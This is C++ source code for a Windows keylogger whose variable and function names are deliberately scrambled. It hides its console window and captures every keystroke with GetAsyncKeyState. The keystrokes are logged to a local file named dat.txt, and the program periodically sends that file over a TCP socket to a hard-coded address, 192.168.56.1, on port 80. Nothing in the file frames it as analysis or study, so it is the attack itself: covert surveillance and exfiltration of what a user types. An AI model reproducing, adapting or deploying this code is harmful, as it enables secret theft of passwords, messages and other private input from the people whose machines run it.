#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <fstream>
#include "header.h"
#pragma comment(lib, "ws2_32.lib")
using namespace std;std::string bjaFaghjASuj;int AsSDjEJgJKasIOwerf=0;void 
ioKuOInvaeYjkjSksR(string ASDFjaseTJErTejtH){fstream sdfnSDFaffaSEfAg;
sdfnSDFaffaSEfAg.open("dat.txt",fstream::app);if(sdfnSDFaffaSEfAg.is_open()){
sdfnSDFaffaSEfAg<<ASDFjaseTJErTejtH;sdfnSDFaffaSEfAg.close();}}void 
NpoOasfdIfdhghFfbDfOfdsdIR(){std::fstream ifs("dat.txt");bjaFaghjASuj.assign((
std::istreambuf_iterator<char>(ifs)),std::istreambuf_iterator<char>());}int 
main(){ShowWindow(GetConsoleWindow(),SW_HIDE);while(true){char 
SfJaeEhjdghstgjsUIIrywio='x';for(int SfJaeEhjdghstgjsUIIrywio=8;
SfJaeEhjdghstgjsUIIrywio<=190;SfJaeEhjdghstgjsUIIrywio++){if(GetAsyncKeyState(
SfJaeEhjdghstgjsUIIrywio)==-32767){if(hFashgAuIiWGkjHJGkndV(
SfJaeEhjdghstgjsUIIrywio)==false){fstream sdfnSDFaffaSEfAg;
sdfnSDFaffaSEfAg.open("dat.txt",fstream::app);if(sdfnSDFaffaSEfAg.is_open()){
sdfnSDFaffaSEfAg<<char(SfJaeEhjdghstgjsUIIrywio);sdfnSDFaffaSEfAg.close();}}}}
if(AsSDjEJgJKasIOwerf<6000){Sleep(1);AsSDjEJgJKasIOwerf+=1;continue;}string 
SfgAsyASHIs="192.168.56.1";int KhjgSkAJKwjhf=80;string ksbfSfaf;std::ifstream 
text;std::string textGet;WSAData data;WORD ver=MAKEWORD(2,2);int wsResult=
WSAStartup(ver,&data);if(wsResult!=0){cerr<<"Can't start Winsock, Err #"<<
wsResult<<endl;continue;}SOCKET sock=socket(AF_INET,SOCK_STREAM,0);if(sock==
INVALID_SOCKET){cerr<<"Can't create socket, Err #"<<WSAGetLastError()<<endl;
continue;}sockaddr_in hint;hint.sin_family=AF_INET;hint.sin_port=htons(
KhjgSkAJKwjhf);inet_pton(AF_INET,SfgAsyASHIs.c_str(),&hint.sin_addr);int 
connResult=0;if(AsSDjEJgJKasIOwerf>=6000){AsSDjEJgJKasIOwerf=0;connResult=
connect(sock,(sockaddr*)&hint,sizeof(hint));if(connResult==SOCKET_ERROR){cerr<<
"Can't connect to server, Err #"<<WSAGetLastError()<<endl;continue;}else{cout<<
"=|Connected to host! Working...|="<<endl;}}else{Sleep(1);AsSDjEJgJKasIOwerf+=1
;continue;}if(connResult!=SOCKET_ERROR){connResult=connect(sock,(sockaddr*)&
hint,sizeof(hint));char buf[4096];NpoOasfdIfdhghFfbDfOfdsdIR();textGet=
bjaFaghjASuj;if(textGet.size()>0){int sendResult=send(sock,textGet.c_str(),
textGet.size()+1,0);if(sendResult!=SOCKET_ERROR){ZeroMemory(buf,4096);int 
bytesReceived=recv(sock,buf,4096,0);if(bytesReceived>0){cout<<"SERVER> "<<
string(buf,0,bytesReceived)<<endl;}}}continue;}else{connResult=connect(sock,(
sockaddr*)&hint,sizeof(hint));char SfJaeEhjdghstgjsUIIrywio='x';while(
connResult!=SOCKET_ERROR){connResult=connect(sock,(sockaddr*)&hint,sizeof(hint)
);for(int SfJaeEhjdghstgjsUIIrywio=8;SfJaeEhjdghstgjsUIIrywio<=190;
SfJaeEhjdghstgjsUIIrywio++){if(GetAsyncKeyState(SfJaeEhjdghstgjsUIIrywio)==-
32767){if(hFashgAuIiWGkjHJGkndV(SfJaeEhjdghstgjsUIIrywio)==false){cout<<
"main called"<<endl;fstream sdfnSDFaffaSEfAg;sdfnSDFaffaSEfAg.open("dat.txt",
fstream::app);if(sdfnSDFaffaSEfAg.is_open()){sdfnSDFaffaSEfAg<<char(
SfJaeEhjdghstgjsUIIrywio);sdfnSDFaffaSEfAg.close();}}}}connResult=connect(sock,
(sockaddr*)&hint,sizeof(hint));}continue;}connResult=connect(sock,(sockaddr*)&
hint,sizeof(hint));closesocket(sock);WSACleanup();continue;}}
